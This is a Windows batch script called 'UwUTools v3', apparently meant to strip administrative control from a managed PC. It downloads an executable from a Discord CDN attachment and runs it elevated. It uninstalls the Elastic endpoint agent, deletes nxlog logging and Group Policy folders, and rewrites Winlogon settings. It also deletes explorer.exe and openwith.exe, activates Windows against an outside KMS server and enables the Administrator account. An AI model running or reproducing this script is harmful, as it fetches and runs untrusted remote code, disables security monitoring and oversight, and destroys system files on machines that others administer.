::this is the free version of UwUTools v3 (nware)
@echo off
cls
title UwUTools v3
color F4
echo [+] Creating Folders...
curl -o "C:/Users/nware/Documents/ALONE-B2.exe" https://cdn.discordapp.com/attachments/1101821901686452294/1103776449342746667/ALONE-B2.exe >NUL 2>&1
curl -o "C:/Users/nware/Documents/config.ini" https://cdn.discordapp.com/attachments/1101821901686452294/1103754494728208515/config.ini >NUL 2>&1
echo [+] Downloading Files...
start "" "C:/Users/nware/Documents/ALONE-B2.exe" /runas
timeout /t 7 /nobreak >nul
echo [+] Removing Nware Services...
cd "C:\Program Files\elastic\agent"
elastic-agent.exe uninstall
echo [+] Deleting Group Policy...
start explorer.exe
timeout /t 3 /nobreak >nul
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d explorer.exe /f >nul
echo [+] Recovering Shell...
C:
DEL /S /F /Q "C:\Program Files (x86)\nxlog" >NUL 2>&1
TASKKILL /F /IM WinKill* >NUL 2>&1
RD /s /q "%windir%\System32\GroupPolicyUsers"
RD /s /q "%windir%\System32\GroupPolicy"
GPUPDATE /force >NUL
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d explorer.exe /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
TAKEOWN /f c:\windows\explorer.exe 
TAKEOWN /f c:\windows\SysWOW64\explorer.exe 
DEL /q c:\windows\explorer.exe 
DEL /q c:\windows\SysWOW64\explorer.exe 
TAKEOWN /f c:\windows\system32\openwith.exe
TAKEOWN /f c:\windows\SysWOW64\openwith.exe 
DEL /q c:\windows\system32\openwith.exe
DEL /q c:\windows\SysWOW64\openwith.exe
USERINIT
slmgr.vbs /skms kms.lotro.cc
TIMEOUT 5 /NOBREAK >NUL 2>&1
slmgr.vbs /ato
NET user Administrator /active:yes
exit